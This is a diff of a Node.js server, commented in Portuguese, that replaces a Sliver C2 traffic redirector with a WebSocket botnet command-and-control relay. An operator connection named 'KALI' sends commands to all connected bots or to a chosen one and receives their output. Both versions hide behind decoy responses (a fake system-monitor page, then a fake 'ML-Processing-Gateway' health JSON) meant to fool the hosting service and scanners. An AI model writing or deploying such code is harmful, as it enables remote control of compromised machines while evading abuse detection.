@@ -1,57 +1,75 @@
 const WebSocket = require('ws');
 const http = require('http');
 
-const PORT = process.env.PORT || 10000;
-let KALI_WS = null;
-
 const server = http.createServer((req, res) => {
-    // 1. Simulação de Site Real (Engana o Render e scanners)
-    if (req.method === 'GET' && !req.url.includes('id=')) {
-        res.writeHead(200, {'Content-Type': 'text/html'});
-        res.end(`
-            <html>
-                <head><title>System Monitor v4.2</title></head>
-                <body style="background:#1a1a1a;color:#00ff00;font-family:monospace;padding:20px;">
-                    <h2>> System Status: OK</h2>
-                    <p>> Uptime: ${process.uptime().toFixed(0)}s</p>
-                    <p>> Nodes: Active</p>
-                    <div style="border:1px solid #333;padding:10px;">Monitoring background processes...</div>
-                </body>
-            </html>
-        `);
-        return;
+    // Página fake para parecer um serviço de API comum
+    res.writeHead(200, { 'Content-Type': 'application/json' });
+    res.end(JSON.stringify({ status: "healthy", version: "2.0.4", service: "ML-Processing-Gateway" }));
+});
+
+const wss = new WebSocket.Server({ server });
+
+let KALI = null;
+const BOTS = new Map();
+
+wss.on('connection', (ws, req) => {
+    const params = new URLSearchParams(req.url.split('?')[1]);
+    const id = params.get('id');
+
+    if (id === 'KALI') {
+        if (KALI) KALI.terminate();
+        KALI = ws;
+        console.log('[+] Orquestrador Kali Conectado');
+    } else if (id) {
+        BOTS.set(id, ws);
+        console.log(`[+] Novo nó de processamento: ${id}`);
+        // Notifica o Kali sobre o novo trabalhador disponível
+        if (KALI && KALI.readyState === WebSocket.OPEN) {
+            KALI.send(JSON.stringify({ t: 'sys', msg: 'new_worker', bot: id }));
+        }
     }
 
-    // 2. Encaminhamento de Tráfego C2
-    let body = [];
-    req.on('data', chunk => body.push(chunk));
-    req.on('end', () => {
-        const payload = Buffer.concat(body).toString('base64');
-        if (KALI_WS && KALI_WS.readyState === WebSocket.OPEN) {
-            KALI_WS.send(JSON.stringify({
-                type: 'SLIVER_TRAFFIC',
-                path: req.url,
-                method: req.method,
-                headers: req.headers,
-                data: payload
-            }));
-            res.writeHead(200); res.end();
+    ws.on('message', (message) => {
+        try {
+            const data = JSON.parse(message);
+
+            // Se a mensagem vem do KALI
+            if (ws === KALI) {
+                if (data.to === 'ALL') {
+                    // Envio em massa (Broadcast)
+                    BOTS.forEach(bot => bot.send(data.cmd));
+                } else {
+                    // Envio direcionado
+                    const target = BOTS.get(data.to);
+                    if (target) target.send(data.cmd);
+                }
+            } 
+            // Se a mensagem vem de um BOT (Resultado do processamento)
+            else {
+                if (KALI && KALI.readyState === WebSocket.OPEN) {
+                    // Encaminha o resultado para o Kali
+                    KALI.send(JSON.stringify({ t: 'res', f: id, d: data }));
+                }
+            }
+        } catch (e) {
+            // Fallback para mensagens não-JSON
+            if (ws !== KALI && KALI) {
+                KALI.send(JSON.stringify({ t: 'raw', f: id, d: message.toString() }));
+            }
+        }
+    });
+
+    ws.on('close', () => {
+        if (ws === KALI) {
+            KALI = null;
         } else {
-            res.writeHead(503); res.end();
+            BOTS.delete(id);
+            if (KALI && KALI.readyState === WebSocket.OPEN) {
+                KALI.send(JSON.stringify({ t: 'sys', msg: 'worker_lost', bot: id }));
+            }
         }
     });
 });
 
-const wss = new WebSocket.Server({ server });
-wss.on('connection', (ws, req) => {
-    if (req.url.includes('id=KALI')) {
-        KALI_WS = ws;
-        // Anti-timeout: Envia um pequeno sinal a cada 30s para manter o WebSocket vivo
-        const timer = setInterval(() => {
-            if (ws.readyState === WebSocket.OPEN) ws.send(JSON.stringify({type: 'KEEP_ALIVE'}));
-            else clearInterval(timer);
-        }, 30000);
-    }
-});
-
-server.listen(PORT, () => console.log(`Redirecionador Profissional Ativo na porta ${PORT}`));
+const PORT = process.env.PORT || 10000;
+server.listen(PORT, () => console.log(`Gateway rodando em stealth mode na porta ${PORT}`));
